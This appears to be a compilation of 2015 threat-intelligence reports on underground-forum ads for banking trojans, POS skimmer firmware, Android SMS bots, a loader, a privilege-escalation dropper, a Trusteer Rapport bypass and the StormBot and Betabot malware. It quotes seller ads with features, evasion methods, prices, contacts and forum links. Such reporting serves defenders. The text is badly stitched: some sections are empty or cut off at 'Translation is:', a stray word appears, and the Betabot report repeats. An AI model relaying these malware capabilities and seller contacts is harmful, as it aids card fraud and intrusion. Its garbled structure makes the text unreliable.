Source Details

Original report link: CP-1218
Date published: 2015-06-09

Threat Details

Release of a new version of Trojan «VBV bot»

Malware Used

  • VBV bot

Summary

Advertisement of a selling of a new version of «VBV bot» was detected on the underground forum. Previous version of the malware were selling at the end of 2014. But customers posted many negative reviews. According to the author of malware new version of the Trojan was completely reconstructed and doesn’t have defects of previous versions. The malware is meant for stealing information from bank cards, which is required for Internet transactions. The Trojan can intercept card number, CVV, card expiry date and other data, using «Fake» pages. Also the Trojan has functions of formgrabber and stealer. In this way malefactor can get authentication data, which was saved or entered in the browser.

Original Report Detail:

Advertising analysis

On 14/05/2015, an advertisement of a selling of a new version of «VBV bot» was posted on the underground forum (Picture 1).

Malefactors use the malware for stealing confidential information from bank cards, which is required for Internet transactions. Also Trojan can steal logins and passwords for accessing into internet banking systems. 

The Trojan uses following scheme of work:

  • The malware intercepts entering card number in the Internet
  • The Trojan redirects to phishing URL, where was created exact copy of VBV page
  • A victim enters data of bank card and they will transferred to malicious server.

Victim will redirected to legitimate page for continuation of payment.

The Trojan works with following browsers: Internet Explorer, Firefox, and Chrome.

Group-IB specialists contacted with malefactor for getting additional information (Picture 2).

 

Translation is:

------------------------------------------

 [16:29:17] <ftp_admin> hello, the bot doesn’t have admin panel, but there are some scripts for gathering statistics

 [16:50:52] <***> Ok, does it have some bypassing methods. And I want to get statistic about quantity of connections with malicious server.

 [16:53:00] <ftp_admin> http://tinypic.com/view.php?pic=2u795if&s=8

[16:53:50] <ftp_admin> example of fake page. There are pages with additional fields, but all of them have form of original page. I don’t have actual statistic, because we create new Chrome.

 [16:54:13] <***> and what about bypassing methods, where were saved logs.

[16:54:59] <ftp_admin> using usermode process

[16:55:04] <ftp_admin> it saves separately card data and formgrbber data in the server

 [17:00:27] <***> and what about VBV gathering and uniqueness of method?

[17:01:33] <ftp_admin> on all sites

[17:01:39] <ftp_admin> where user enters card number – the Trojan intercepts it and redirects user

[17:01:47] <ftp_admin> to the fake url, original fake

[17:01:50] <ftp_admin> and after that user will redirected to legitimate page for continuation of payment

 [17:12:23] <***> Will antiviruses detect redirections?

[17:12:57] <ftp_admin> no

[17:16:59] <***> what about the price?

[17:17:35] <ftp_admin> $1000

[17:17:44] <ftp_admin> it is price without Chrome

-----------------------------------------

It was revealed that the Trojan doesn’t have admin panel. Also malefactor told that he tries to improve working of Trojan with Chrome browser.

Also the author gave a screenshot of fake page (Picture 3).

Profile on the author of advertisement

Nickname

ftp_admin

Kind of cybercrime activity

Creating malware

 

Main account on the Underground forum

https://exploit.in/forum/index.php?showuser=36048

Contacts

ftp_admin@exploit.im

Date of registration

02.02.2011

Amount of messages on the Underground forum

300

Main services

06.06.2011 – selling of «FTP Iframer»

https://exploit.in/forum/index.php?showtopic=49138

03.11.2014 – selling of previous version of «VBV bot»

https://exploit.in/forum/index.php?showtopic=83817

14.05.2015 – selling of new version of «VBV bot»

https://exploit.in/forum/index.php?showtopic=89799

Potential threats

  • The Trojan uses combination of methods for stealing card information and authentication data for accessing into internet banking systems. It lets malefactors to get all critical banking data.
  • Instead of web-inject method the Trojan uses redirections to a fake page. It lets Trojan to escape detection by some antiviruses.
  • The malware is in active development stage.

Threat Details

Summary

Original Report Detail:

Advertising analysis

On 19.12.2014 an advertisement of selling firmware for POS – terminal VERIFONE VX 670 has been detected on underground forum (Picture 1).

 

Advertising text is:

------------------------------------------

Firmware for VERIFONE VX 670

 

Package includes:

This firmware can:

  • Сapture Track 1
  • Сapture Track 2
  • Сapture Dump and PIN
  • Send obtained data via SMS
  • Or send obtained data on PC

The New Year's price is 450$ per customer.

 

Contact via PM.

------------------------------------------

 

Also author sells cables for firmware. The price is 50$ (Picture 2).

doga

Source Details

Original report link: CP-1113
Date published: 2015-02-04

Threat Details

Selling of POS skimmer software

Summary

Advertisement of selling POS skimmer software was detected on underground forum. The software is used to preprogram following terminals (Verifone): Vx510, Vx570, Vx610, Vx670. After preprogramming POS terminals can steal data from bank cards (Track 1, Track 2, PIN codes). Compromised POS terminal can’t contact with a bank.

Original Report Detail:

Advertising analysis

On 28/01/2015, an advertisement of selling POS skimmer software was detected on underground forum (picture 1).

Author offers special software which can preprogram POS terminals. After preprogramming POS terminal will work like skimmer and all credit cards, which are used on this terminal, will be compromised.

 The next models of POS terminals may be used by carders for compromising cards data:

  • Vx510
  • Vx570
  • Vx610
  • Vx670

 Advertising text is:

 ------------------------------------------

Продам полный комплект прошивки для верифонов.

Подходит к моделям vx510, 570, 610 и 670.

После прошивки терминал сохраняет в себя 1 и 2 треки и пин-код, транзакции не проводит, то есть работает в режиме эмуляции.

Несколько языков, различный внешний вид чеков.

Цена прошивки - 15 000 рублей, гарант за ваш счет

С прошивкой можно сделать сколько угодно фейк-терминалов

Можно работать самому, или же продавать прошитые терминалы.

Купившим так же подскажу где недорого взять сами терминалы (по себестоимости, это около 1500р за 510 и 7-9к за 670)

-----------------------------------------

 Translation is:

 ------------------------------------------

I sell complete set for preprogramming Verifone.

Suits to the following models: vx510, 570, 610 and 670.

After preprogramming POS terminal saves in itself track 1, track 2, PIN code. It can’t make a transactions, in other words it works in compatibility mode.

There are several languages, various kinds of bills.

Firmware price is 15 000 RUB, the escrow at your expense.

You can create as much as you want terminals using this software.

You can work by yourself or sell compromised terminals.

I help customers with information about where they can buy simple terminals. (At cost, it is about 1500 RUB for vx510 and 7000-9000 RUB for vx670)

-----------------------------------------

 

Profile on the author of advertisement

Nickname

Joshua

Kind of cybercrime activity

Carding

Account on the Underground forum

http://fsell.biz/showthread.php?t=30154

Date of registration

21/07/2014

Amount of messages on the Underground forum

12

Main services

28/01/2015– Selling of POS skimmer software

http://fsell.biz/showthread.php?t=30154

 

Potential threats

  • Recently the number of advertisements about POS skimmer software for Verifone was increased on underground forums. It can leads to a huge increase in stealing card data using compromised («Fake») POS terminals.

Source Details

Original report link: CP-1111
Date published: 2015-02-03

Threat Details

Selling of a new android malware (chibo)

Summary

Advertisement for new android malware was detected on underground forum. Type of the malware is android bot. The bot is meant for the hidden interception of SMS, sending SMS to any number and executing USSD commands.

Original Report Detail:

Advertising analysis

On 07.01.2015 an advertisement for sale of android bot was detected on underground forum (picture 1).

Advertising text is:

 ------------------------------------------

Качественный-многофункциональный андроид бот.

Возможность теста представится.

Цена: 30тыс. руб.

Исходники приложения и серверной части(php) в комплекте.

Или 15тыс. руб.

Без исходников apk приложения, только серверная часть.

При необходимости генерирую новый apk.

icq:4160-555

Работа приложения:

Работать начинает при первом запуске после установки.

Ярлык в меню приложение не создает, поэтому найти его можно только в списке приложений. Под именем "System"

Приложение якобы выдает ошибку:

"Ошибка! Приложение не было установлено, файл поврежден.

[Удалить]"

После нажатия кнопки "Удалить" проигрывается анимация "Удаления" и закрывается приложение.

Таким образом, неопытный пользователь смартфона считает, что он только что удалил загруженное им приложение.

Особенности:

Очень удобная панель управления.

Вкладки: "Только on-line", "Избранные", "Все", "Новые СМС(x)", "Статистика", "Настройки"

Удобная история СМС (Поддерживается статус исходящих: "Отправлено", "Доставлено", в противном случае - причина ошибки).

В версиях Android 4.2 и выше СМС не удаляются с телефона.

Антивирусы:

Результаты теста:

Dr.Web - нежелательное ПО.

Kasperskiy - пропустил.

Avast - обнаружил троянец.

Возможности:

Перехват/отправка СМС на любой номер(в том числе и на платные номера).

Выполнение ussd-команд.

Загрузка списка СМС.

Рассылка СМС по контактам.

Рассылка СМС по фильтрам(Всем, on-line, избранным, по операторам, по странам)

СМС команды:

allSms - Пересылка СМС с номера, на котором будет получена команда, на номер, с которого будет отправлена команда(если нет доступа к сети интернет).

send НОМЕР ТЕКСТ - СМС команда для отправки СМС с номера получателя.

Настройки:

Категории - управление категориями, в которые легко помещать отдельного бота(автоматически обрабатываются пользователи с подключенным мобильным банком и отправляются в категорию "Мобильный банк").

Перехват сообщений - включение/отключение автоматического удаления входящих СМС на телефоне.

Настройка СМС при первой установке.

Статистика:

Всего установок: -

Установок сегодня: -

Установок вчера: -

Установок за неделю: -

Установок за месяц: -

Отстучались за 3 часа: -

Отстучались за сутки: -

-----------------------------------------

Translation is:

 ------------------------------------------

This is qualitative and multifunctional android bot.

Also there is a free test.

Price: 30 000 RUB - source codes of software and server part (php)

Or price is 15 000 RUB – without source codes of apk application, the server part only

I can generate new apk, if it is necessary.

Icq: 4160555

Operating procedure:

The software starts to work when it is run by user after installation.

The application doesn’t create a shortcut in the menu therefore user can find it only in the list of applications under the name of «System».

The application shows an error:

«Error! The application wasn't installed, the file is damaged. [Delete]»

After pushing the «Delete» button the «Removal» animation is played and the application is closed. Thus, inexperienced smartphone user think that he has just deleted the downloaded application.

Features:

Very convenient control panel.

Tabs: «Only on-line», « Favourites», «All», «New SMS (x)», «Statistics», «Settings»

Convenient SMS history (The status of outgoing messages is supported: «Sent», «Delivered», otherwise - a cause of error).

SMS aren't removed from phone in Android 4.2 versions and above.

Antiviruses:

Test results:

Dr.Web - potentially unwanted program

Kasperskiy - missed.

Avast - the trojan is found.

Opportunities:

Interception/ Sending SMS to any number (including the pay numbers)

Executing ussd-commands.

Loading of the SMS list

Sending SMS on the contacts

Sending SMS using filters (All, On-line, Favourites, By operators, By countries)

SMS commands:

allSms - Sending SMS from the number which a command is received,to the number from which the command will be sent(if there isn’t access to the Internet)

send NUMBER TEXT - SMS command to send SMS from the number of the recipient.

Settings:

Categories - management of categories in which it’s easy to place the certain bot (users which are connected to the mobile bank are automatically processed and moved to the «Mobile Bank» category).

Interception of messages - enable/disable auto-deleting incoming SMS on the phone.

Configuring SMS - when you first install.

Statistics:

Total installations: -

Installations today: -

Installations yesterday: -

Installations per week: -

Installations per month: -

Number of infected machines try to contact their C&C server per 3 hours: -

Number of infected machines try to contact their C&C server per 24 hours: -

-----------------------------------------

On 16.01.2015 information about stopping selling the malware was posted by the author (picture 2).

Advertising text is:

------------------------------------------

Продажа не актуальна.

------------------------------------------

 

Translation is:

------------------------------------------

Selling isn’t relevant.

------------------------------------------

 

Comments about android bot

Comments from forum members (picture 3, picture 4):

  • The software completely answers to the description and the seller helped to adjust everything.

Profile on the author of advertisement

Nickname

chibo

Kind of cybercrime activity

Selling malware

Contacts

ICQ – 4160555

Account on the Underground forum

http://darkmoney.cc/members/chibo-56417/

 

Date of registration

25.12.2014

Amount of messages on the Underground forum

9

Main services

07.01.2015 – Selling  of android malware

http://darkmoney.cc/soft-93/prodam-android-bot-65273/

 

Potential threats

  • The malware can send SMS to any numbers. Malefactors can use that for sending SMS to the pay number for the purpose of stealing balance of an user.
  • The trojan has good ability to hide itself and emulate unistalling. It is reduces the likelihood of detecting malware by user.
  • Due to the possibility of execution of ussd-commands, the confidential information of the victim become available to malefactors, some data can be used by them to steal money from existing bank accounts.
  • Using SMS interception malefactors can get SMS codes for fraudulent transactions.

Original report link: CP-1171
Date published: 2015-04-08

Threat Details

Sale of a new android malware "Android Bankir"

Malware Used

  • Android Bankir

Summary

Advertisement of a new android malware was detected on underground forum. Type of the malware is android bot. The bot is meant for the hidden interception of confidential information: Full credit card data, Authentication information for logging on Internet banking systems, SMS messages

Original Report Detail:

Advertising analysis

On 01.04.2015 an advertisement of selling android bot was detected on underground forum (picture 1).

Advertisement of selling android bot (exploit.in)

Advertising text is:

 ------------------------------------------

Продам софт android сборщик CC и BA - инжект + все необходимые функции для слива.

В комплект входит:

  • Сорцы.
  • Админка.
  • Лендинг для распространения.
  • Помощь с первой компиляцией.
  • Помощь в первоначальной настройке.

 Цена $5к, строго через гаранта.

Продажа строго в одни руки, БЕЗ права перепродажи, сдачи в аренду и передачи третьим лицам.

Человеку с репутацией.

Первая связь ЛС.

Покупатель должен сам четко понимать что делать с софтом, т.к. я не обучаю как его использовать

П.С. всех вынюхивателей и других людей не заинтересованных в покупке просьба не беспокоить.

Подробную информацию о софте даю только после верификации через 3 площадки.

На тест не даю, аренды нет и не будет, только продажа.

-----------------------------------------

Translation is:

 ------------------------------------------

I sell android software for grabbing CC and for injecting bank accounts + all required functions for cashing out money.

There are following items in the set:

  • Source code
  • Admin panel
  • Landing page for malware spreading
  • I will help with first compilation
  • I will help with first setting

Price is $5000, I sell only via escrow service.

I sell for only one man, without option of selling back, renting, transferring to third person.

The customer must have good reputation.

First contact only via PM.

 Customer must know what he should do with the software, as I don’t teach how you should use it.

P.S. Please, don’t disturb if you don’t interested in buying of malware or if you only try to get some information about software.

I will give detailed information after verification on 3 forums.

There aren’t tests, rent, only selling.

-----------------------------------------

For prevention of information leakage, the author refuse to give additional information about the Trojan. But by request of users of the forum he shows some screenshots (pictures 2,3,4)

Original report link: CP-1190
Date published: 2015-05-13

Threat Details

Release of a new service for creating phishing projects

Summary

Advertisement of a new service for creating phishing pages was detected on the underground forum. The main feature of the service is that the author of advertisement can develop any phishing project by request of a customer. Also he offers maintenance developed projects.

Original Report Detail:

Advertising analysis

On 08/05/2015, an advertisement of a new service for creating phishing pages was posted on the underground forum (picture 1).

Advertising text is:

------------------------------------------

Особенности:

- Установка готового продукта на Linux VPS для демонстрации и проверок со стороны заказчика.

- Ведение статистики переходов и действий в режиме реального времени (по выбору).

- Обслуживание и корректировки продукта в течении 7, 14, 30 дней (по выбору).

- Проверка front-end продукта на разных ОS / UserAgents (по выбору).

Гарантии:

- Возможна работа через гарант.

- Оплата после выполнения и демонстрации работы.

- Возможна отправка продукта вперёд людям с репутацией.

Цена зависит от таких факторов как: сложность, дополнительные услуги, дополнительные функции, срок обслуживания на сервере, вёрстка для других браузеров. К каждому клиенту индивидуальный подход.

-----------------------------------------

Translation is:

------------------------------------------

Features:

  • Installing of finished product to Linux VPS for demonstration and examination from customer
  • Real-time statistics visits and actions of victims (option)
  • Maintenance and correction product during 7, 14, 30 days (option)
  • Checking front-end product on different OS / UserAgents (option)

Guarantee:

  • You can pay using escrow service
  • You can pay after demonstration of finished product work
  • I can send finished product before payment to users with good reputation

The price depends on many various factors like: complexity, additional services, term of maintenance on server, front and end development. Individual customer approach.

-----------------------------------------

Original report link: CP-1222
Date published: 2015-06-18

Threat Details

Selling of «HVNC» malware source code

Malware Used

  • HVNC
  • Socks5 bot

Summary

Advertisement for a sale of «HVNC» malware source code was detected on the underground forum. The malware is meant for hidden installation of remote desktop software VNC in the victim’s system. The author noted that he sells source code of new version of the Trojan, which was developed by himself. Also he offers source code of Socks 5 bot, it allows to use victim’s system as a proxy server

Original Report Detail:

Advertising analysis

On 15/06/2015, an advertisement for a selling of «HVNC» and «Socks5 bot» source codes was posted on the underground forum - Picture 1.

«HVNC» malware is meant for hidden installation of remote desktop software VNC in the victim’s system. The malware is written in C++. There are following features:

  • The trojan can work using limited user account
  • Backconnect feature allow to connect to compromised systems which are beyond NAT or router
  • It supports all remote desktop software features
  • There are 3 work modes (camera, desktop, hidden desktop)
  • It supports «multimonitor» feature

The malefactors has following features in hidden desktop mode:

  • Turning off sound on the victim’s machine
  • Working with user’s browser, using his cookies
  • Using separated clipboard

Also the author offers source code of common Socks 5 bot.

The author noted that he doesn’t want to rent the malware, he want to participate in project as a developer. He is going to find only 5 clients so as not to allow to source code fall into public.

On 16/06/2015 he posted message that two copies of source code were sold and that he added source code of joiner (malware is meant for splicing files and for hiding malware).

Price of complete set is 1500 WMZ.

Profile on the author of advertisement

Nickname

brovnc

Kind of cybercrime activity

Developing malware

Contacts

brovnc@sternenschweif.de

Account on the Underground forum

https://exploit.in/forum/index.php?showuser=62007

Date of registration

13.06.2015

Amount of messages on the Underground forum

4

Main services

15.06.2015 – selling of malware source code

https://exploit.in/forum/index.php?showtopic=90760

Potential threats

  • The Trojan can be used by malefactors for target attacks and critical data compromise.
  • The author is developer of the Trojan and offers participation in projects. That can lead to modernization of the malware for specific goals of malefactors.

Original report link: CP-1131
Date published: 2015-02-24

Threat Details

Release of a new loader "Kraken HTTP Loader" for uploading malware

Malware Used

  • Kraken HTTP Loader

Summary

Advertisement of a new loader for uploading malware was detected on underground forum The Trojan is being used by malefactors for uploading other malware. Main features of the loader are small size, good persistence and excellent abilities to hide.

Original Report Detail:

Advertising analysis

On 06/12/2014, an advertisement of a selling a new loader was posted on the underground forum (picture 1).

The author of the advertisement noted that the loader is a new project and it will develop.

This malware is meant for Windows Systems:

  • Windows 95,Windows NT_4,Windows 98,Windows ME, Windows 2000,Windows XP
  • Windows Server 2003, 2008, 2008_R2, 2012
  • Windows 7
  • Windows 8/8.1

Also author told that his product will work under Windows 10.

Loader can execute following features:

  • Visit Website hide or Visible
  • Download & Execute
  • Download & Inject DLL
  • Update with MD5 Check
  • Uninstall

That is resident malware, i.e. it can persists in the system.

The author noted following features:

  • Bin Write in FASM (under 25kb packed with UPX) (ATM it's 18Kb)
  • Startup install with HKCU Key & HKLM
  • Bypass UAC
  • C&C Backup (if the first C&C is down, bot connect to a second C&C)
  • Unicode support (work under all system, even with Chinese, Japon, Arabic, Russia)
  • There is defense from running on a virtual machine
  • Path and variable were encrypted
  • RootKit Ring3 (File hidden from Explorer / Registry, and Process Protected from Killed)
  • There are features for killing another bots
  • There is bitcoin monitor module. It detects any BTC addresses copied to the clipboard of the PC and replaces them with a customer specified address.

The malware has some defense features. If a user try to delete registry keys, the Trojan will add their again. Also the bot uses trusted Windows process for installing in the system in the form of «critical process».

Also the author informed about admin panel features:

  • Login system with AntiBruteforce (if user enters 3X wrong user/password, he get banned for about 24 Hours)
  • Statistic about Bots
  • Bots information "IP Addresse, Computer, Operating System, (32/64bit), HWID, Version, Status" in DashBoard
  • Java, Steam, Origin install check
  • Antivirus, Firewall check
  • Using filters
  • Logging
  • Enable or disable botkill module

Screenshots of admin panel are shown on pictures 2,3,4,5,6,7.

The author informed that he only sells this product and he isn't coder. The coder prefers to stay anonymous. All users noted that the malware works stable and is very cheap.

Version history

10.12.2014 the author posted information about first update of the malware (picture 8).The main feature of this update was ability to detect antivirus.

27.12.2014 second update was released (picture 9).There are some features for statistics gathering in this update.

12.01.2015 a new module for advertisement clicking was released (picture 10).

20.01.2015 third update was released (picture 11). The update permit to download and execute JAR files. Also a new module was released – I2P Backup. If C&C servers are down the bots connect to I2P server to get a new C&C server.

  • The loader can be used for infecting by POS malware, as most of e-cash systems use OS Windows. After infection, fraudsters can compromise dumps of credit cards and PIN codes.

Original report link: CP-1211
Date published: 2015-05-29

Threat Details

Release of a new dropper «K1» v.2.0

Malware Used

  • K1

Summary

Dropper is meant for hidden installation of malware to a target system. Dropper exploits latest vulnerability CVE-2015-0057. Exploiting of the vulnerability leads to privilege escalation, getting full control of a target system, bypassing all windows defenses. The vulnerability works on all versions of Windows OS

Original Report Detail:

Advertising analysis

On 27/05/2015, an advertisement of a selling a new dropper «K1» was posted on the underground forum (Picture 1).

The dropper is second version of malware which was used by malefactors from 2013. Earlier the dropper used CVE-2013-3660 for privilege escalation.

New dropper based on exploiting vulnerability CVE-2015-0057. The vulnerability was detected at February 2015. Exploiting of the vulnerability leads to privilege escalation, getting full control of a target system, bypassing all windows defenses. The main feature of the vulnerability is that it works on all versions of Windows OS.

The author noted following advantages of the dropper:

  • Vulnerability exploitation (CVE-2015-0057) doesn’t lead to memory repression. And exploit executes without system overload.
  • A victim can’t detect dropper’s work (with CVE-2013-3660 exploit there are some lags on victim’s computer)
  • The dropper can start malware even in case of crashing

Vulnerability exploitation leads to executing of the code at the kernel level. It allows to inject system process without interception by proactive defense. Thus malicious code, which is carried by dropper, executes on behalf of trusted process.

There are two methods for starting malicious payload of dropper (malicious payload may be inside in dropper or on the remote server):

  • Writing on hard drive and starting by standard windows modes on behalf of system process.
  • Starting malware directly from system process memory

The main features of dropper are:

  • Downloading «exe» on behalf of system process, which has permission to access to the network
  • Bypassing proactive cyber defense of antivirus (tested with KIS 2015, Avast IS 2015, ESET Smart Security 8). In case of impossibility of starting malware on a target system, dropper will try to start malware without bypassing.
  • Bypassing windows defenses (SMEP, Kernel DEP, KASLR, change low Integrity Level, UAC and others)
  • Running from guest account

Price of dropper is $4000.

Advertising analysis

On 23/03/2015, an advertisement of selling of IBM Security Trusteer Rapport (Internet Banking security software) bypassing method has been published on the underground forum - Picture 1.

Translation is:

---------------------------

Method of Trusteer Rapport bypassing (Antirapport)

 

Computers with Trusteer Rapport software are «most interesting». Solution allows not to lose computers with such software installed, to inject into browsers and to execute malicious code (for example to intercept functions). Solution works with the latest version of Trusteer Rapport. Solution works only in user mode, doesn’t install any drivers and doesn’t delete Trusteer Rapport’s drivers, so it is invisible for user and there is green icon of Trusteer Rapport in browser.

 

This solution is not public, it isn’t code of Carberp or other known methods. Everything was reversed by hand, there are source codes on cpp, description and information about working principle in the pack.

---------------------------

 

 

On 03/03/2015 author of the advertisement informed that his solution is relevant and works with the latest version of Trusteer Rapport (1404.75) - Picture 2.

 

Translation is:

---------------------------

Original report link: CP-1192
Date published: 2015-05-14

Threat Details

New version of *nix DDoS bot StormBot (version 3.0)

Malware Used

  • StormBot

Summary

Advertisements of new version of *nix DDoS bot StormBot (version 3.0) selling were detected on Underground forums

Original Report Detail:

Advertising analysis

On 04.12.2013 an advertisement of Storm.Bot v.1 has been published on underground forum - Picture 1.

During 1.5 years project was being developed and some new versions were released. At this period all sellings of Storm.Bot were conducted only via exploit.in underground forum. Storm.Bot got a lot of positive comments from users.

 

04.05.2015 – start of new version (StormBot 3.0) selling on exploit.in (Picture 2).

08.05.2015 and 13.05.2015 advertisements of StormBot 3.0 selling have been published on other Underground forums: verified.mn, monopoly.ms, ccc.mn (Pictures 3-5).

 

DDoS bot characteristics

  • It is not necessary to have botnet to use this product, because client may use high-powered 1 Gbit servers able to conduct spuffing. It may conduct about 30 Gbit amplification ant attacks from 100 up to 300 Gbit.
  • Full-automatic and fast installation of bot.
  • All modules of bot are in one bin file.
  • Created on C language.
  • Obfuscated and packed with own algorithm.
  • Bot deletes itself after launching.
  • Bot disguises as system process, parameters of launching are hidden, no records in history.
  • C&C-server automatically uploads bot during each attack.
  • Small size (less than 30kb).
  • Able to work on any *nix system (x86, x64).
  • Traffic between C&C-server and bot is encrypted.
  • All client’s data on servers is encrypted.

 

Parameters of attacks

Amplification:

  • Three modes (1 stream, 2 streams, Turbo mode depending on server’s possibilities)
  • DNS-amplification attack: DNS, SSDP, NTP, SYN Reflection
  • SYN (TCP) amplification. Ability to increase PPS efficiency by five
  • Full uploading to the memory of file with public resolvers
  • Attack using one/several/random ports
  • Attack on any size subnets
  • Attack on any diapason of subnets
  • Using of maximum efficiency of dedicated server at one time with low CPU load
  • Simultaneously amplification from different domains
  • Choosing of DNS Query type for attack (A/TXT/ANY)
  • Choosing of country (realized in the C&C side)
  • Multithreading

 

TCP/UDP/IGMP:

  • Three modes (1 stream, 2 streams, Turbo mode depending on server’s possibilities)
  • Attacks SYN (Syn-Random, Syn-IP-list, Syn-Country), SYN-ACK, Query-Flood, PUSH, ACKF, PUSH-ACK
  • Attack using one/several/random ports
  • Ability to conduct unique attack
  • Using of maximum efficiency of dedicated server at one time with low CPU load
  • Automatic determination of country of attacking server and further attack only from IP-addresses of this country (Syn-Country flood)
  • Attacks with IP-addresses substitution for the purpose of banning these IPs on the side of antiddos provider
  • Choosing of specific countries for SYN amplification (realized in the C&C side)
  • Ability to choose ACK parameter for Syn-Random, Syn-IP-list, Syn-Country attacks
  • Multithreading

 

Other kinds of attacks (IPsec, DCCP, OSPF, IGMP):

  • Three modes (1 stream, 2 streams, Turbo mode depending on server’s possibilities)
  • Non-public attacks destroying difficult requests
  • Attack using one/several/random ports
  • Multithreading

 

Price

  1. Basic - 1500$

Available attack modules:

 

ICMP, SYN, UDP, DNS-AMPL, NTP-AMPL

  1. Full - 3000$

Available attack modules:

 

ICMP, SYN, UDP, DNS-AMPL, NTP-AMPL

Query-Flood, SSDP-AMPL, SYN-ACK, PUSH-ACK, SYN-REFLECT

DCCP, IGMP, IPSEC, OSP, PUSH, ACKF

 

  1. Test access 100$

 

Contacts OF YHREAT ACTOR

Jabber: Storm.Bot@exploit.im

 

Screensots of interface - Pictures 6-13.

 

Potential threats

  • DDoS attacks lead to lost of productivity and downtime of resourse.
  • Significant loss of revenue from sales and services due to resourse’s unavailability.
  • In some cases, malefactors use DDoS-attacks as «red herring» to get an access for corporate information and view confidential data.
  • StormBot regularly gets updates, it increases possibility to bypass antiddos services.
  • Service provides different types of attacks.

Original report link: CP-1202
Date published: 2015-05-20

Threat Details

New version of multitasking bot «Betabot» (1.8) for OS Windows

Malware Used

  • Betabot

Summary

Advertisement about changing of owner of famous bot «Betabot» was detected on Underground forum. First public sales of Betabot were in 2013. At the end of 2014 Betabot’s author stopped supporting and updating of this product. Main features of bot are AV bypassing (either proactive AV protection), interception of authentication data in browsers, uploading of additional malware to victim’s machine. This bot is not modular and has not function of web-injects

Original Report Detail:

Advertising analysis

28.10.2013 an advertisement of «Betabot 1.6» sale has been published on underground forum (Picture 1).

According to the author (Sacklunch), private sales of bot started in January 2013. This Trojan program got o lot of positive comments from users. Author continued to develop this software. Many users of underground forums asked to add function of web-injects and to make bot to be modular. Bur author (Sacklunch) refused to do it.

For efficient processing of orders author registered domain «betabot.ru», now this domain is not available.

Picture 2 - Archive screenshot of betabot.ru.

Firstly bot had following functions:

  • System-wide Userkit (Ring3 rootkit) - х86 rootkit component for interception of low-level functions of system call (KiFastSystemCall and x86SwitchTo64BitMode) for all system calls interception made by process.
  • ANTI-AV Module – for escalation of privileges. It looks like legitimate window UAC (after obtaining of admin access Trojan able to disable more than 30 AV solutions) - Picture 3.

     

  • ANTI-MALWARE MODULE – module uses heuristic analysis for neutralization of other malware.
  • Bot protection system – process, bot file, register data are under permanent protection, if register keys are deleted it will be recovered.
  • System of injecting into legitimate process is used for AV bypassing.
  • DNS redactor for interception of functions, which are responsible for DNS working in victim’s system (can be used for phishing).
  • Files searching is conducted in the infected system using filters. After that files are archived (zip) and sent to malefactor’s server.
  • Formgrabber is used for stealing of authenticate data in browsers.
  • Module of grabbing FTP/POP3/SSH is used for real-time passwords stealing and sending of in to malefactor’s server.
  • Mode of proactive protection – if this mode is turned on, Trojan will block any attempts to install another malware into system.
  • Opportunity of DDoS attacks conduction (UDP, HTTP FLOOD, CONNECT-DISCONNECT FLOOD, SLOWLORIS FLOOD).

 

11.01.2014 update 1.7 was released. In this version functions of AV-killer and proactive protection bypassing have been updated. Besides, system of requests to server has been changed – became more random for difficulty of behavioral analysis of Trojan.

Functions of TOR browser formgrabbing and SSL connection with C&C have been added - Picture 4.

 

After that advertisement author periodically continued to release small updates, but users noted that author became to support his product worse than before.

In September 2014 users informed about author completely stopped to support Betabot (Pictures 5-7).

 

Analysis of new advertisement

13.05.2015 an advertisement of new version «Betabot 1.8.0.8» sale has been published on underground forum (Picture 8).

 

 

Author of this advertisement (Nightcrawler) informs that he is new owner of «Betabot» and he will support and develop this product.

Update of old versions to the latest version costs 100$.

New owner informs that he able to support only RU clients.

New version of Betabot has following functions:

  • Using of rootkit (usermode). This rootkit works on all versions of OS including Win8. Also there is optional function to use rootkit for x64.
  • Botkiller allows to uninstall competitor malware using heuristic methods and behavioral analysis.
  • System of protection against uninstalling of Trojan (adding of register keys and other methods).
  • Formgrabber allows to intercept authenticate data from browsers Internet Explorer, Firefox, Chrome. After that Trojan sorts compromised data in control panel. Malefactor can set filters to intercept from specific URL and with specific POST requests.
  • Module of FTP/MAIL grabber is used for real-time passwords stealing and sending it to C&C server. Malware also able to work with POP3 (SSL) but probability of success interception of authenticate data is about 40%.
  • Bypassing of proactive AV protection.

Malware doesn’t work with Comodo и Outpost AVs, also there are some problems with Kaspersky AV.

  • DNS redactor for interception of functions, which are responsible for DNS working in victim’s system (can be used for phishing).
  • Files searching is conducted in the infected system using filters. After that files and sent to malefactor’s server.
  • Mode of proactive protection – if this mode is turned on, Trojan will block any attempts to install another malware into system. Author recommends to use this mode if client has no goal to upload another malware software to the victim’s machine. There are three new methods of proactive protection:
  1. Blocking of BTC miners working
  2. Turning off all critical functions of previous Betabot versions
  3. Bootkits working blocking
  • Opportunity of DDoS attacks conduction (UDP, HTTP FLOOD, CONNECT-DISCONNECT FLOOD, SLOWLORIS FLOOD)
  • Opportunity to distribute bot via USB
  • Using of Socks4 servers with UPNP
  • In control panel there is new system of separation of loads into two groups for the purpose of working simplification.
  • Opportunity to upload and activate another malware software. Betabot supports uploading of CPL/DLL files, DLL launching via rundll32, also it able to inject into trusted processes.
  • Supporting up to 10 domains.
  • Function of protection against launching in virtual machine.

Threat Details

New version of multitasking bot «Betabot» (1.8) for OS Windows

Malware Used

  • Betabot

Summary

Advertisement about changing of owner of famous bot «Betabot» was detected on Underground forum. First public sales of Betabot were in 2013. At the end of 2014 Betabot’s author stopped supporting and updating of this product. Main features of bot are AV bypassing (either proactive AV protection), interception of authentication data in browsers, uploading of additional malware to victim’s machine. This bot is not modular and has not function of web-injects

Original Report Detail:

Advertising analysis

28.10.2013 an advertisement of «Betabot 1.6» sale has been published on underground forum (Picture 1).

According to the author (Sacklunch), private sales of bot started in January 2013. This Trojan program got o lot of positive comments from users. Author continued to develop this software. Many users of underground forums asked to add function of web-injects and to make bot to be modular. Bur author (Sacklunch) refused to do it.

For efficient processing of orders author registered domain «betabot.ru», now this domain is not available.

Picture 2 - Archive screenshot of betabot.ru.

Firstly bot had following functions:

  • System-wide Userkit (Ring3 rootkit) - х86 rootkit component for interception of low-level functions of system call (KiFastSystemCall and x86SwitchTo64BitMode) for all system calls interception made by process.
  • ANTI-AV Module – for escalation of privileges. It looks like legitimate window UAC (after obtaining of admin access Trojan able to disable more than 30 AV solutions) - Picture 3.

     

  • ANTI-MALWARE MODULE – module uses heuristic analysis for neutralization of other malware.
  • Bot protection system – process, bot file, register data are under permanent protection, if register keys are deleted it will be recovered.
  • System of injecting into legitimate process is used for AV bypassing.
  • DNS redactor for interception of functions, which are responsible for DNS working in victim’s system (can be used for phishing).
